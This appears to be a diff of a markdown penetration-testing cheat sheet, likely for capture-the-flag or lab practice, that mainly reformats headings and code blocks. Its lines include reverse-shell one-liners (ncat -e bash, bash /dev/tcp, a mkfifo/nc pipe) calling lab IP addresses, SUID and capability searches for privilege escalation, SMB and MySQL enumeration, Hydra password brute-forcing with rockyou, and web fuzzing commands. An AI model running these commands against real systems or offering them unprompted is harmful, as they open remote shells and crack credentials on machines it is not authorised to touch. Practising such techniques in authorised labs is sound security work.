@@ -5,6 +5,7 @@ ncat 10.11.99.141 5555 -e bash
 /bin/bash -c /bin/bash -i >& /dev/tcp/10.9.184.226/1112 0>&1
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.14.85.242 9001 >/tmp/f
 ```
+
 # Nmap_enumeration ✅
 ```bash
 sudo nmap -p- <ip> -sV -T5
@@ -18,7 +19,6 @@ getcap -r / 2>/dev/null
 find /  -perm -04000 -ls 2>/dev/null
 find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \;
 ```
-———————————————
 # SMB ✅
 ```bash
 enum4linux -a
@@ -28,7 +28,6 @@ smbclient //<ip>/<share dir>
 smbclient //<ip>/<share dir> -p <port>
 smbclient //<ip>/<share dir> -U Anonymous -p <port>
 ```
-———————————————
 # MySQL ✅
 ## *enumeration ✡️
 ```bash
@@ -49,18 +48,20 @@ select * from <table>;
 
 SELECT * FROM <table_name> WHERE <column_name> LIKE '%search_string%';
 ```
-———————————————
-Hydra Attack Type Cheat Sheet ✅
+# Hydra Attack Type Cheat Sheet ✅
+```bash
 hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -vV <ip> ftp
 hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -f <ip> -s 80 http-get /protected/ -I
 hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -f <ip> -s 80 http-post-form "/<dir>:username=^USER^&password=^PASS^:<Faild Error>" -vV -I
-———————————————
-WEB ✅
-*subdomains_enumeration ✡️
+```
+# WEB ✅
+## *subdomains_enumeration ✡️
+```bash
 gobuster vhost -u http://example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt —append-domain -t 100 --no-error 
 ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://example.com/ -H "Host:FUZZ.example.com" -fw 6
 wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,404,403 -H "Host: FUZZ.example.com" -u http://example.com -t 100
-*directory _enumeration ✡️
+```
+## *directory _enumeration ✡️
 nikto -h http://example.com
 
 dirb http://example.com
